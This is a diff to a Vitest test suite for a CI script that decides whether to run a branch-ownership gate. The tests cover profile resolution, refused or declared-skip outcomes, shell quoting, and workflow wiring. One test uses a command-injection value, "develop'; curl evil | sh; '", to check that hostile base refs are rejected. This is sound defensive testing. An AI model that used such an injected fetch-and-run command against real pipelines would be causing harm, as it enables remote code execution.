@@ -4,11 +4,61 @@
  * The expensive failure this prevents is not a broken build. It is a Backend or
  * Database change riding inside a Frontend phase: reviewed as Frontend, gated
  * by no Backend job, and invisible until it breaks something in production.
+ *
+ * The second half of this file — from "a pull-request context resolves a
+ * profile" onwards — is about the OTHER way a gate stops working: not a wrong
+ * verdict, but no verdict at all, reported as success. See
+ * `decideOwnershipRun()`.
  */
-import { readFileSync } from 'node:fs';
-import { join } from 'node:path';
+import { readFileSync, readdirSync } from 'node:fs';
+import { dirname, join } from 'node:path';
+import { fileURLToPath } from 'node:url';
 import { describe, expect, it } from 'vitest';
-import { classify, evaluate, PROFILES } from '../../scripts/ci/check-phase-ownership.mjs';
+import {
+  DEFAULT_BASE,
+  PROFILE_MAP_PATH,
+  PROFILES,
+  PROTECTED_BRANCHES,
+  PULL_REQUEST_EVENTS,
+  classify,
+  decideOwnershipRun,
+  envFileBody,
+  evaluate,
+  shellQuote,
+} from '../../scripts/ci/check-phase-ownership.mjs';
+
+const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
+const WORKFLOWS = join(REPO_ROOT, '.github', 'workflows');
+const NODE_QUALITY = join(WORKFLOWS, '_reusable-node-quality.yml');
+
+/**
+ * True when a workflow's top-level `on:` block names `pull_request`.
+ *
+ * Scanned line by line rather than matched with a regex. The regex form of this
+ * — `/^on:\s*$\n(?:\s+.*$\n)*?\s{2}pull_request:/m` — backtracks
+ * catastrophically on the files where it does NOT match, because `\s+` and `.*`
+ * can divide the same line between them in exponentially many ways. It hung the
+ * suite rather than failing it, which is the one outcome worse than red.
+ */
+function firesOnPullRequest(source: string): boolean {
+  const lines = source.split(/\r?\n/);
+  const start = lines.findIndex((l) => /^on:\s*$/.test(l));
+  if (start === -1) return false;
+  for (let i = start + 1; i < lines.length; i += 1) {
+    const line = lines[i] ?? '';
+    if (line.trim() === '' || line.startsWith('#')) continue;
+    // The block ends at the first line that is not indented.
+    if (!/^\s/.test(line)) return false;
+    if (/^ {2}pull_request:/.test(line)) return true;
+  }
+  return false;
+}
+
+/** The real committed branch → profile map, so the cases are about real rules. */
+const RULES = JSON.parse(readFileSync(join(REPO_ROOT, PROFILE_MAP_PATH), 'utf8')).rules as {
+  branchPrefix: string;
+  profile: string;
+}[];
 
 describe('classify', () => {
   it('places each path in the bucket that owns it', () => {
@@ -263,5 +313,281 @@ describe('profile declarations', () => {
     expect(forbidden).toContain('apiSource');
     expect(forbidden).toContain('supabase');
     expect(forbidden).toContain('migrations');
+  });
+});
+
+describe('a pull-request context resolves a profile and runs the gate', () => {
+  it('resolves the head branch against the committed map', () => {
+    const verdict = decideOwnershipRun({
+      headBranch: 'p1-27/ci-gates',
+      baseRef: 'develop',
+      eventName: 'pull_request',
+      refName: '42/merge',
+      rules: RULES,
+    });
+    expect(verdict.action).toBe('check');
+    expect(verdict.checked).toBe(true);
+    expect(verdict.profile).toBe('p1-27-frontend');
+    expect(verdict.base).toBe('origin/develop');
+  });
+
+  it('refuses a head branch no rule claims, rather than defaulting', () => {
+    const verdict = decideOwnershipRun({
+      headBranch: 'wildcat/whatever',
+      baseRef: 'develop',
+      eventName: 'pull_request',
+      rules: RULES,
+    });
+    expect(verdict.action).toBe('refuse');
+    expect(verdict.checked).toBe(false);
+    expect(verdict.reason).toContain('declares no changed-file ownership profile');
+  });
+
+  it('refuses an EMPTY map instead of treating it as permissive', () => {
+    // An empty `rules` array would otherwise take the same path as an unmapped
+    // branch and blame the branch for a broken file.
+    const verdict = decideOwnershipRun({
+      headBranch: 'p1-27/ci-gates',
+      baseRef: 'develop',
+      eventName: 'pull_request',
+      rules: [],
+    });
+    expect(verdict.action).toBe('refuse');
+    expect(verdict.reason).toContain('declares no rules');
+  });
+});
+
+describe('the absence of a pull request is never a silent success', () => {
+  it.each(PULL_REQUEST_EVENTS)('REFUSES a %s run whose caller passed no refs', (event) => {
+    /*
+     * The case that makes the whole suite worth having. If a caller drops
+     * `head-branch:`, the step must break — not fall through to the skip path
+     * and disable the ownership gate for every pull request at once.
+     */
+    const verdict = decideOwnershipRun({ eventName: event, refName: '7/merge', rules: RULES });
+    expect(verdict.action).toBe('refuse');
+    expect(verdict.checked).toBe(false);
+    expect(verdict.reason).toContain('would judge nothing and report success');
+  });
+
+  it('refuses half a context', () => {
+    for (const half of [
+      { headBranch: 'p1-27/ci-gates', baseRef: '' },
+      { headBranch: '', baseRef: 'develop' },
+    ]) {
+      const verdict = decideOwnershipRun({
+        ...half,
+        eventName: 'push',
+        refName: 'x',
+        rules: RULES,
+      });
+      expect(verdict.action, JSON.stringify(half)).toBe('refuse');
+      expect(verdict.reason).toContain('exactly one of the');
+    }
+  });
+
+  it('refuses a run that cannot name its own event', () => {
+    const verdict = decideOwnershipRun({ refName: 'develop', rules: RULES });
+    expect(verdict.action).toBe('refuse');
+    expect(verdict.reason).toContain('cannot establish its own context');
+  });
+
+  it('refuses a push that carries no ref name either', () => {
+    const verdict = decideOwnershipRun({ eventName: 'push', rules: RULES });
+    expect(verdict.action).toBe('refuse');
+    expect(verdict.reason).toContain('no ref name');
+  });
+
+  it('refuses an unmapped branch push — the same answer a pull request gets', () => {
+    const verdict = decideOwnershipRun({
+      eventName: 'workflow_dispatch',
+      refName: 'someones-scratch-branch',
+      rules: RULES,
+    });
+    expect(verdict.action).toBe('refuse');
+    expect(verdict.reason).toContain('declares no changed-file ownership profile');
+  });
+});
+
+describe('a push on an ORDINARY branch resolves the profile from the pushed ref', () => {
+  // This is the case that used to skip: `pr-ci.yml` also fires on
+  // `workflow_dispatch`, where the pull-request fields are empty. There is no
+  // pull request, but the profile map is keyed on the branch and the branch is
+  // right there.
+  it.each([['push'], ['workflow_dispatch']])('%s on a mapped branch runs the gate', (event) => {
+    const verdict = decideOwnershipRun({
+      eventName: event,
+      refName: 'remediation/p1-27-partner-identity',
+      rules: RULES,
+    });
+    expect(verdict.action).toBe('check');
+    expect(verdict.checked).toBe(true);
+    expect(verdict.profile).toBe('p1-27-backend-partner-identity');
+    expect(verdict.base).toBe(DEFAULT_BASE);
+  });
+});
+
+describe('a protected push is a DECLARED skip, not a pass', () => {
+  it.each(PROTECTED_BRANCHES)('declares the skip on %s and reports checked: false', (branch) => {
+    const verdict = decideOwnershipRun({ eventName: 'push', refName: branch, rules: RULES });
+    expect(verdict.action).toBe('declared-skip');
+    // The property the whole exercise is about: whatever else this run reports,
+    // it does not report that ownership was checked.
+    expect(verdict.checked).toBe(false);
+    expect(verdict.profile).toBeNull();
+    expect(verdict.reason).toContain('DECLARED SKIP');
+    expect(verdict.reason).toContain('nothing was checked');
+  });
+
+  it('is the ONLY outcome that neither checks nor fails', () => {
+    /*
+     * Enumerated rather than asserted case by case: if a future edit adds a
+     * quiet fourth way out, this fails. `checked === false && action !== refuse`
+     * is exactly the shape of the defect, and exactly one situation is allowed
+     * to have it.
+     */
+    const situations = [
+      { eventName: 'pull_request', headBranch: 'p1-27/x', baseRef: 'develop' },
+      { eventName: 'pull_request', refName: '9/merge' },
+      { eventName: 'pull_request_target', refName: '9/merge' },
+      { eventName: 'push', refName: 'p1-27/x' },
+      { eventName: 'push', refName: 'develop' },
+      { eventName: 'push', refName: 'main' },
+      { eventName: 'push', refName: 'unmapped' },
+      { eventName: 'push' },
+      { eventName: 'workflow_dispatch', refName: 'develop' },
+      { eventName: 'workflow_dispatch', refName: 'feature/p1-27-integration' },
+      {},
+    ];
+    const quiet = situations
+      .map((s) => ({ s, v: decideOwnershipRun({ ...s, rules: RULES }) }))
+      .filter(({ v }) => v.checked === false && v.action !== 'refuse');
+    expect(quiet.map(({ s }) => JSON.stringify(s))).toEqual([
+      JSON.stringify({ eventName: 'push', refName: 'develop' }),
+      JSON.stringify({ eventName: 'push', refName: 'main' }),
+      JSON.stringify({ eventName: 'workflow_dispatch', refName: 'develop' }),
+    ]);
+    expect(quiet.every(({ v }) => v.action === 'declared-skip')).toBe(true);
+  });
+});
+
+describe('every profile the map can select is one the ownership gate defines', () => {
+  it('resolves to a defined profile for each committed rule', () => {
+    expect(RULES.length).toBeGreaterThan(0);
+    for (const rule of RULES) {
+      const verdict = decideOwnershipRun({
+        headBranch: `${rule.branchPrefix}sample`,
+        baseRef: 'develop',
+        eventName: 'pull_request',
+        rules: RULES,
+      });
+      expect(verdict.action, rule.branchPrefix).toBe('check');
+      expect(
+        Object.keys(PROFILES),
+        `${rule.branchPrefix} resolves to ${verdict.profile}, which check-phase-ownership.mjs does not define`
+      ).toContain(verdict.profile);
+    }
+  });
+});
+
+describe('the values the run block sources cannot escape their quotes', () => {
+  it('quotes a value containing a single quote', () => {
+    expect(shellQuote("a'b")).toBe(`'a'\\''b'`);
+  });
+
+  it('emits three keys and nothing derived from a branch name', () => {
+    const body = envFileBody(
+      decideOwnershipRun({
+        headBranch: 'p1-27/ci-gates',
+        baseRef: 'develop',
+        eventName: 'pull_request',
+        rules: RULES,
+      })
+    );
+    expect(body).toContain("OWNERSHIP_ACTION='check'");
+    expect(body).toContain("OWNERSHIP_PROFILE='p1-27-frontend'");
+    expect(body).toContain("OWNERSHIP_BASE='origin/develop'");
+    expect(body).not.toContain('ci-gates');
+  });
+
+  it('refuses a base ref that is not a usable ref name', () => {
+    // Both defences are live: the value never reaches `shellQuote` at all.
+    const verdict = decideOwnershipRun({
+      headBranch: 'p1-27/ci-gates',
+      baseRef: "develop'; curl evil | sh; '",
+      eventName: 'pull_request',
+      rules: RULES,
+    });
+    expect(verdict.action).toBe('refuse');
+    expect(verdict.reason).toContain('not a usable ref name');
+  });
+});
+
+describe('the step is wired to the decision, and the callers are wired to the step', () => {
+  const nodeQuality = readFileSync(NODE_QUALITY, 'utf8');
+  /** The `Changed-file ownership` step body, indentation and all. */
+  const step = (() => {
+    const start = nodeQuality.indexOf('- name: Changed-file ownership');
+    expect(start, 'the ownership step is gone from _reusable-node-quality.yml').toBeGreaterThan(0);
+    const next = nodeQuality.indexOf('\n      - name:', start + 1);
+    return nodeQuality.slice(start, next === -1 ? undefined : next);
+  })();
+
+  it('delegates the decision to the module rather than to a shell conditional', () => {
+    expect(step).toContain('node scripts/ci/check-phase-ownership.mjs --resolve-context');
+    expect(step).toContain('OWNERSHIP_EVENT_NAME: ${{ github.event_name }}');
+    expect(step).toContain('OWNERSHIP_REF_NAME: ${{ github.ref_name }}');
+  });
+
+  it('contains no bare `exit 0` — the shape the defect had', () => {
+    /*
+     * Stated as a property of the text because that is where the defect lived:
+     *
+     *     if [ -z "${HEAD_BRANCH}" ] || [ -z "${BASE_REF}" ]; then … exit 0; fi
+     *
+     * A step that ends itself successfully before doing its work cannot be
+     * distinguished from one that did the work, by anything downstream.
+     */
+    expect(step).not.toMatch(/^\s*exit 0\s*$/m);
+  });
+
+  it('runs the ownership gate only on the `check` verdict, and does run it', () => {
+    expect(step).toMatch(/if \[ "\$\{OWNERSHIP_ACTION\}" = "check" \]/);
+    expect(step).toContain('npm run validate:phase-ownership');
+    expect(step).toContain('PHASE_OWNERSHIP_PROFILE="${OWNERSHIP_PROFILE}"');
+    expect(step).toContain('PHASE_OWNERSHIP_BASE="${OWNERSHIP_BASE}"');
+  });
+
+  it('keeps the declared skip as retrievable evidence', () => {
+    expect(step).toContain('--json phase-ownership-context.json');
+    expect(nodeQuality).toContain('            phase-ownership-context.json\n');
+  });
+
+  it('every pull-request caller of static-quality passes both refs', () => {
+    /*
+     * The other half of the silent skip. `decideOwnershipRun()` now REFUSES a
+     * `pull_request` run with no refs, so a caller that drops one breaks in CI
+     * — but it breaks after the pull request is opened. This says so here.
+     */
+    const callers = readdirSync(WORKFLOWS).filter((f) => f.endsWith('.yml'));
+    let checked = 0;
+    for (const file of callers) {
+      const source = readFileSync(join(WORKFLOWS, file), 'utf8');
+      if (!source.includes('_reusable-node-quality.yml')) continue;
+      if (!source.includes('task: static-quality')) continue;
+      if (!firesOnPullRequest(source)) continue;
+      const job = source.slice(source.indexOf('task: static-quality'));
+      const body = job.slice(0, job.indexOf('\n\n') === -1 ? undefined : job.indexOf('\n\n'));
+      expect(body, `${file} calls static-quality on a pull request without head-branch`).toContain(
+        'head-branch:'
+      );
+      expect(body, `${file} calls static-quality on a pull request without base-ref`).toContain(
+        'base-ref:'
+      );
+      checked += 1;
+    }
+    // Anti-vacuity: a loop that matched no workflow would pass having asserted
+    // nothing, which is the failure mode this whole file is about.
+    expect(checked, 'no pull-request caller of static-quality was found at all').toBeGreaterThan(0);
   });
 });
